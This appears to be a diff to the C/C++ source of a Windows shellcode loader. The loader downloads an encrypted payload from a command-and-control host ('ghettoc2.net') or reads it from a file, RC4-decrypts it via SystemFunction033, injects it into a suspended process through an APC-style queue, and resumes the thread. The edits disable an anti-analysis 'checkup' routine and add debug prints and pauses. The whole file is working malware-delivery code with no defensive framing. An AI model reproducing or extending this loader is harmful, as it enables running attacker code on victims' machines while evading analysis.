@@ -7,7 +7,7 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-#define DEBUGGING 1
+#define DEBUGGING 0
 #define USEHTTP 0
 
 #define MAXSHELLCODESIZE 4096
@@ -118,18 +118,21 @@ BOOL checkup()
 
 }
 
+unsigned long temp;
 
 int main(int argc, char **argv)
 {
 	char _key[] = "advapi32.dll";
+#if DEBUGGING == 1
 	int i;
+#endif
 
-    if (!checkup()) {
+#if 0
+	if (!checkup()) {
         fprintf(stderr, "Bailing out\n");
         return 0;
     }
 
-#if 0
 	//	fprintf(stderr, "Unhooking\n");
 
 #if DEBUGGING == 1
@@ -157,6 +160,7 @@ int main(int argc, char **argv)
     LPVOID          start_address = NULL;
     SIZE_T          code_size;
     DWORD           oldProtect = NULL;
+	unsigned long shellcode_size;
 
 #if DEBUGGING == 1
     printf("Starting download\n");
@@ -165,8 +169,6 @@ int main(int argc, char **argv)
 #if USEHTTP == 0
 	unsigned int  bytesread;
 #endif
-
-	volatile unsigned long shellcode_size;
 
 #if USEHTTP == 1
 	std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
@@ -195,6 +197,7 @@ int main(int argc, char **argv)
 
 	fclose(fp);
 	shellcode_size = (unsigned long)bytesread;
+	temp = shellcode_size;
 #endif
 
 #if DEBUGGING == 1
@@ -261,7 +264,8 @@ int main(int argc, char **argv)
 #endif
     }
 
-//	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
+	shellcode_size = temp;
+	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
 #if USEHTTP == 1
 	std::copy(begin(shellcode), end(shellcode), buf);
 #endif
@@ -271,13 +275,16 @@ int main(int argc, char **argv)
 	key.Length = sizeof(_key);
 	key.MaximumLength = sizeof(_key);
 
-//	fprintf(stderr, "3.Shellcode size is \n", shellcode_size);
+	shellcode_size = temp;
+	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
+	temp = shellcode_size;
 
 	_data.Buffer = (PUCHAR)buf;
 	_data.Length = shellcode_size;
 	_data.MaximumLength = shellcode_size;
 	
 #if DEBUGGING == 1
+	int i;
 	fprintf(stderr, "Key structure, size %d:\n", sizeof(key));
 	struct ustring *p = &key;
 	unsigned char *c = (unsigned char *)p;
@@ -296,14 +303,16 @@ int main(int argc, char **argv)
 	
 	SystemFunction033(&_data, &key);
 
-//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+	shellcode_size = temp;
+	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
 
 #if DEBUGGING == 1
 	printf("Decrypted, press enter to continue...\n");
 	getchar();
 #endif
 
-	//fprintf(stderr, "Decrypted\n");
+	shellcode_size = temp;
+	fprintf(stderr, "Decrypted, shellcode size is %d\n", shellcode_size);
 
 	// Copy encrypted shellcode into allocated memory
 	//fprintf(stderr, "4.Shellcode size is %d\n", shellcode_size);
@@ -355,6 +364,9 @@ int main(int argc, char **argv)
 #endif
     }
 
+	fprintf(stderr, "In the queue!\n");
+	getchar();
+
     ntstatus = NtResumeThread(process_info->hThread, NULL);
     if (!NT_SUCCESS(ntstatus)) {
 #if DEBUGGING == 1
@@ -367,6 +379,9 @@ int main(int argc, char **argv)
         fprintf(stderr, "Thread resumed\n");
 #endif
     }
+
+	fprintf(stderr, "Resumed\n");
+	getchar();
 
     // close handles
     CloseHandle(process_info->hThread);
